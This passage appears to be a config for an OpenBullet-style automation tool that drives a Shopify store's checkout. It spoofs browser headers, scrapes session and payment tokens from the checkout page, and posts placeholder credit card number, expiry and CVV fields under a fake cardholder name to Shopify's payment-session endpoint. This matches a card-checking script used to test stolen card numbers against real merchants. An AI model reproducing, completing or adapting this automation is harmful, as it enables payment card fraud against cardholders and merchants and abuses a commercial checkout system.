  CONTENTTYPE "application/json" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36" 
  HEADER "Accept: application/json" 
  HEADER "Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
  HEADER "Content-Type: application/json" 
  HEADER "Origin: https://<site>" 
  HEADER "Sec-CH-UA: \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"" 
  HEADER "Sec-CH-UA-Mobile: ?0" 
  HEADER "Sec-CH-UA-Platform: \"Windows\"" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "X-SDK-Variant: portable-wallets" 
  HEADER "X-Shopify-Storefront-Access-Token: <site_key>" 
  HEADER "X-Start-Wallet-Checkout: true" 
  HEADER "X-Wallet-Name: MoreOptions" 

checkout_url PARSE "<SOURCE>" LR "\"checkoutUrl\":\"" "\"" CreateEmpty=FALSE -> VAR "checkout_url" 

# Step 4: Get checkout page
REQUEST GET "<checkout_url>?auto_redirect=false" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" 
  HEADER "Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
  HEADER "Sec-CH-UA: \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"" 
  HEADER "Sec-CH-UA-Mobile: ?1" 
  HEADER "Sec-CH-UA-Platform: \"Windows\"" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-Fetch-User: ?1" 
  HEADER "Upgrade-Insecure-Requests: 1" 
  HEADER "Pragma: no-cache" 

# Extract tokens from checkout page
paymentMethodIdentifier PARSE "<SOURCE>" LR "paymentMethodIdentifier&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "payment_idf" 

stable_id PARSE "<SOURCE>" LR "stableId&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "stable_id" 

queue_token PARSE "<SOURCE>" LR "queueToken&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "queue_token" 

currency_code PARSE "<SOURCE>" LR "currencyCode&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "currency_code" 

country_code PARSE "<SOURCE>" LR "countryCode&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "country_code" 

x_check PARSE "<SOURCE>" LR "serialized-session-token\" content=\"&quot;" "&quot;\"" CreateEmpty=FALSE -> VAR "x_check" 

tok PARSE "<SOURCE>" LR "serialized-source-token\" content=\"&quot;" "&quot;\"" CreateEmpty=FALSE -> VAR "tok" 

web_build PARSE "<SOURCE>" LR "\"sha\":\"" "\"" CreateEmpty=FALSE -> VAR "web_build" 

tax1 PARSE "<SOURCE>" LR "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;" "&quot" CreateEmpty=FALSE -> VAR "tax1" 

gateway PARSE "<SOURCE>" LR "extensibilityDisplayName&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "gateway" 

DMT PARSE "<SOURCE>" LR "deliveryMethodTypes&quot;:[&quot;" "&quot;],&quot;" CreateEmpty=FALSE -> VAR "DMT" 

# Step 5: Create payment session
REQUEST POST "https://checkout.pci.shopifyinc.com/sessions" 
  CONTENT "{\"credit_card\":{\"number\":\"<cc>\",\"month\":<mes>,\"year\":<ano>,\"verification_value\":\"<cvv>\",\"name\":\"Laka Lama\"},\"payment_session_scope\":\"<site>\"}" 
